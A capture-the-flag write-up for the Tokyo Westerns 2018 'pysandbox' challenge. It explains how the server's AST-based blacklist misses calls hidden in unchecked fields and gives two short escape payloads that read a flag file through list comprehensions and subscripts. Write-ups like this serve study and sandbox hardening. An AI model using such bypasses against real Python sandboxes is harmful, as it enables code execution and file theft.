# Tokyo Western 2018: pysandbox

__Tags:__ `misc`
 
## Problem Statement

let's break sandbox.  
start from `nc pwn1.chal.ctf.westerns.tokyo 30001`

Update(2018-09-01 10:22 UTC):  
slightly patched sandbox.py to avoid netcat issues.

```
81c81
<     expr = sys.stdin.read()
---
>     expr = sys.stdin.readline()
```

### Server Code

```python
import sys
import ast


blacklist = [ast.Call, ast.Attribute]

def check(node):
    if isinstance(node, list):
        return all([check(n) for n in node])
    else:
        """
    expr = BoolOp(boolop op, expr* values)
         | BinOp(expr left, operator op, expr right)
         | UnaryOp(unaryop op, expr operand)
         | Lambda(arguments args, expr body)
         | IfExp(expr test, expr body, expr orelse)
         | Dict(expr* keys, expr* values)
         | Set(expr* elts)
         | ListComp(expr elt, comprehension* generators)
         | SetComp(expr elt, comprehension* generators)
         | DictComp(expr key, expr value, comprehension* generators)
         | GeneratorExp(expr elt, comprehension* generators)
         -- the grammar constrains where yield expressions can occur
         | Yield(expr? value)
         -- need sequences for compare to distinguish between
         -- x < 4 < 3 and (x < 4) < 3
         | Compare(expr left, cmpop* ops, expr* comparators)
         | Call(expr func, expr* args, keyword* keywords,
             expr? starargs, expr? kwargs)
         | Repr(expr value)
         | Num(object n) -- a number as a PyObject.
         | Str(string s) -- need to specify raw, unicode, etc?
         -- other literals? bools?

         -- the following expression can appear in assignment context
         | Attribute(expr value, identifier attr, expr_context ctx)
         | Subscript(expr value, slice slice, expr_context ctx)
         | Name(identifier id, expr_context ctx)
         | List(expr* elts, expr_context ctx)
         | Tuple(expr* elts, expr_context ctx)

          -- col_offset is the byte offset in the utf8 string the parser uses
          attributes (int lineno, int col_offset)

        """

        attributes = {
            'BoolOp': ['values'],
            'BinOp': ['left', 'right'],
            'UnaryOp': ['operand'],
            'Lambda': ['body'],
            'IfExp': ['test', 'body', 'orelse'],
            'Dict': ['keys', 'values'],
            'Set': ['elts'],
            'ListComp': ['elt'],
            'SetComp': ['elt'],
            'DictComp': ['key', 'value'],
            'GeneratorExp': ['elt'],
            'Yield': ['value'],
            'Compare': ['left', 'comparators'],
            'Call': False, # call is not permitted
            'Repr': ['value'],
            'Num': True,
            'Str': True,
            'Attribute': False, # attribute is also not permitted
            'Subscript': ['value'],
            'Name': True,
            'List': ['elts'],
            'Tuple': ['elts'],
            'Expr': ['value'], # root node
        }

        for k, v in attributes.items():
            if hasattr(ast, k) and isinstance(node, getattr(ast, k)):
                if isinstance(v, bool):
                    return v
                return all([check(getattr(node, attr)) for attr in v])


if __name__ == '__main__':
    expr = sys.stdin.read()
    body = ast.parse(expr).body
    if check(body):
        sys.stdout.write(repr(eval(expr)))
    else:
        sys.stdout.write("Invalid input")
    sys.stdout.flush()
```

## Solution

This sandbox uses python's `ast` module to parse the input string to its corresponding _abstract syntax tree_. This is what python uses to represent scripts during runtime.

A quick reading of the server scripts shows that when check encounters a `Call` or `Attribute` in the expression, it will be considered invalid.

```python
# Allowed
1 + 2
[1, 2]

# Not Allowed
len([1, 2])
[1, 2].append(3)
''.__class__
```

The incorrect way to approach this problem is to look for ways to be able to do this __without__ `Call`. Instead, we should look for areas in the tree __not seen by `check`__.

The task was nice enough to put a comment that can be found from python's `ast` [module documentation](https://docs.python.org/2/library/ast.html).

```
expr = BoolOp(boolop op, expr* values)
        | BinOp(expr left, operator op, expr right)
        | UnaryOp(unaryop op, expr operand)
        | Lambda(arguments args, expr body)
        | IfExp(expr test, expr body, expr orelse)
...
```

These list down the different components of a particular expression, and the `attributes` dictionary shows the parts that `check` traverses. We compare the two and identify several parts that are not checked.

Here are some examples:

| Original                                             | Implemented Checks    | Unchecked parts |
|------------------------------------------------------|-----------------------|-----------------|
| Lambda(arguments args, expr body)                    | 'Lambda': ['body']    | args            |
| ListComp(expr elt, comprehension* generators)        | 'ListComp': ['elt']   | generators      |
| Subscript(expr value, slice slice, expr_context ctx) | Subscript': ['value'] | slice, ctx      |


Based on this we can infer that any `Call` in those parts will not be checked.

All of the unchecked parts can be used to hide calls. Here are two ways of getting the flags based on the findings above:

### Using List Comprehensions

```
[e for e in list(open('flag'))]
```

### Using Subscript

```
[][sys.stdout.write(open('flag').read())]
```

### Note of Flag2

For the second flag, it is really the same thing, but the `attributes` inside the `check` function is more complete.

```python
        attributes = {
            'BoolOp': ['values'],
            'BinOp': ['left', 'right'],
            'UnaryOp': ['operand'],
            'Lambda': ['body'],
            'IfExp': ['test', 'body', 'orelse'],
            'Dict': ['keys', 'values'],
            'Set': ['elts'],
            'ListComp': ['elt', 'generators'],
            'SetComp': ['elt', 'generators'],
            'DictComp': ['key', 'value', 'generators'],
            'GeneratorExp': ['elt', 'generators'],
            'Yield': ['value'],
            'Compare': ['left', 'comparators'],
            'Call': False, # call is not permitted
            'Repr': ['value'],
            'Num': True,
            'Str': True,
            'Attribute': False, # attribute is also not permitted
            'Subscript': ['value'],
            'Name': True,
            'List': ['elts'],
            'Tuple': ['elts'],
            'Expr': ['value'], # root node
            'comprehension': ['target', 'iter', 'ifs'],
        }

```
